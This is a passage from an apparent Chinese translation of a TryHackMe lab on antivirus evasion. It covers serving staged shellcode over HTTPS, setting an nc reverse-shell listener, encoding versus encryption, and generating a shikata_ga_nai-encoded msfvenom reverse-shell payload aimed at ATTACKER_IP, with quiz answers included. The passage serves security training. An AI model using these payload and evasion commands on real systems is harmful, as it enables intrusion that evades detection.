<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;import http.server, ssl;server_address=(&#x27;0.0.0.0&#x27;,443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile=&#x27;localhost.pem&#x27;,ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()&quot;</span><br></span></code></pre></div></div>
<p>准备好所有这些后，我们现在可以执行我们的阶段器 payload。 阶段器应该连接到 HTTPS 服务器并检索 shellcode.bin 文件，将其加载到内存中并在受害机器上运行它。 请记住设置一个 nc 监听器，以在运行 msfvenom 时指定的相同端口上接收反向 shell：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7474</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 分阶段 payload 是否在单个包中提供我们 payload 的完整内容？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Metasploit payload <code>windows/x64/meterpreter_reverse_https</code> 是分阶段 payload 吗？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 分阶段 payload 的 stage0 是否负责下载要执行的最终 payload？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 按照说明创建一个分阶段 payload 并将其上传到 THM 防病毒检查网站 <code>http://MACHINE_IP/</code> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-7-编码和加密简介">任务 7 编码和加密简介<a href="#任务-7-编码和加密简介" class="hash-link" aria-label="任务 7 编码和加密简介的直接链接" title="任务 7 编码和加密简介的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="什么是编码">什么是编码？<a href="#什么是编码" class="hash-link" aria-label="什么是编码？的直接链接" title="什么是编码？的直接链接" translate="no">​</a></h3>
<p>编码是根据算法或编码类型将数据从其原始状态转换为特定格式的过程。 它可以应用于许多数据类型，例如视频、HTML、URL 和二进制文件（EXE、图像等）。</p>
<p>编码是一个重要的概念，通常用于各种目的，包括但不限于：</p>
<ul>
<li class="">程序编译和执行</li>
<li class="">数据存储和传输</li>
<li class="">数据处理，例如文件转换</li>
</ul>
<p>同样，在 AV 规避技术中，编码也用于隐藏二进制文件中的 shellcode 字符串。 然而，仅靠编码不足以实现规避目的。 如今，AV 软件更加智能，可以分析二进制文件，一旦发现编码字符串，就会对其进行解码以检查文本的原始形式。</p>
<p>您还可以串联使用两个或多个编码算法，使 AV 更难发现隐藏内容。 下图显示我们将 &quot;THM&quot; 字符串转换为十六进制表示，然后使用 Base64 对其进行编码。 在这种情况下，您需要确保您的投放器现在处理此类编码以将字符串恢复到其原始状态。</p>
<p><img decoding="async" loading="lazy" alt="双重文本编码技术" src="data:image/png;base64,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" width="409" height="220" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="什么是加密">什么是加密？<a href="#什么是加密" class="hash-link" aria-label="什么是加密？的直接链接" title="什么是加密？的直接链接" translate="no">​</a></h3>
<p>加密是信息和数据安全的基本要素之一，侧重于防止未经授权的访问和数据操纵。 加密过程涉及将明文（未加密内容）转换为称为密文的加密版本。 不知道加密中使用的算法和密钥，就无法读取或解密密文。</p>
<p>与编码一样，加密技术用于各种目的，例如安全存储和传输数据，以及端到端加密。 加密可以通过两种方式使用：双方之间共享密钥或使用公钥和私钥。</p>
<p>有关加密的更多信息，我们鼓励您查看 <a href="https://tryhackme.com/room/encryptioncrypto101" target="_blank" rel="noopener noreferrer" class="">加密 - Crypto 101</a> 房间。</p>
<p><img decoding="async" loading="lazy" alt="加密和解密概念!" src="/TryHackMe-CN/assets/images/image_20251134-113439-1c36b7cf5cde255908cadf075f4df411.png" width="878" height="476" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="为什么我们需要了解编码和加密">为什么我们需要了解编码和加密？<a href="#为什么我们需要了解编码和加密" class="hash-link" aria-label="为什么我们需要了解编码和加密？的直接链接" title="为什么我们需要了解编码和加密？的直接链接" translate="no">​</a></h3>
<p>AV 供应商实施其 AV 软件，使用静态或动态检测技术将大多数公共工具（如 Metasploit 等）列入阻止列表。 因此，如果不修改这些公共工具生成的 shellcode，您的投放器的检测率会很高。</p>
<p>编码和加密可用于 AV 规避技术，我们在其中对投放器中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏起来，避免被 AV 软件发现。 此外，这两种技术不仅可以用于隐藏 shellcode，还可以用于隐藏函数、变量等。 在本房间中，我们主要关注加密 shellcode 以规避 Windows Defender。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 仅编码 shellcode 是否足以规避防病毒软件？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 编码技术是否使用密钥来编码字符串或文件？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 加密算法是否使用密钥来加密字符串或文件？ (是/否) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-8-shellcode-编码和加密">任务 8 Shellcode 编码和加密<a href="#任务-8-shellcode-编码和加密" class="hash-link" aria-label="任务 8 Shellcode 编码和加密的直接链接" title="任务 8 Shellcode 编码和加密的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="使用-msfvenom-进行编码">使用 MSFVenom 进行编码<a href="#使用-msfvenom-进行编码" class="hash-link" aria-label="使用 MSFVenom 进行编码的直接链接" title="使用 MSFVenom 进行编码的直接链接" translate="no">​</a></h3>
<p>公共工具（如 Metasploit）提供编码和加密功能。 然而，AV 供应商了解这些工具构建其 payload 的方式，并采取措施检测它们。 如果您尝试直接使用这些功能，您的 payload 很可能在文件触及受害者的磁盘时就被检测到。</p>
<p>让我们用这种方法生成一个简单的 payload 来证明这一点。 首先，您可以使用以下命令列出 msfvenom 可用的所有编码器：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing Encoders within the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">--list</span><span class="token plain"> encoders </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> excellent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br></span></code></pre></div></div>
<p>我们可以使用 <code>-e</code>（编码器）开关指示我们想要使用 <code>shikata_ga_nai</code> 编码器，然后使用 <code>-i</code>（迭代次数）开关指定我们想要对 payload 进行三次编码：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Encoding using the Metasploit Framework (Shikata_ga_nai)</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> Windows </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/shell_reverse_tcp </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> x86/shikata_ga_nai </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> compatible encoders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to encode payload with </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> iterations of x86/shikata_ga_nai</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">368</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">395</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iteration</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai chosen with final size </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">422</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of csharp file: </span><span class="token number" style="color:#36acaa">2170</span><span class="token plain"> bytes</span><br></span></code></pre></div></div>
<p>如果我们尝试将新生成的 payload 上传到我们的测试机器，AV 会在我们有机会执行它之前立即标记它：</p>
<p><img decoding="async" loading="lazy" alt="Windows Defender 检测到我们的 payload 为恶意软件!" src="/TryHackMe-CN/assets/images/image_20251150-205017-d3e301a62f4d6635ea60ab864325b7c5.png" width="811" height="439" class="img_ev3q"></p>
<p>如果编码不起作用，我们总是可以尝试加密 payload。 直观上，我们预计这会具有更高的成功率，因为解密 payload 对 AV 来说应该是一项更困难的任务。 让我们现在尝试一下。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="使用-msfvenom-进行加密">使用 MSFVenom 进行加密<a href="#使用-msfvenom-进行加密" class="hash-link" aria-label="使用 MSFVenom 进行加密的直接链接" title="使用 MSFVenom 进行加密的直接链接" translate="no">​</a></h3>
<p>您可以使用 msfvenom 轻松生成加密的 payload。 然而，加密算法的选择有些有限。 要列出可用的加密算法，您可以使用以下命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing encryption modules within the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">--list</span><span class="token plain"> encrypt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Framework Encryption Formats </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">--encrypt </span><span class="token operator" 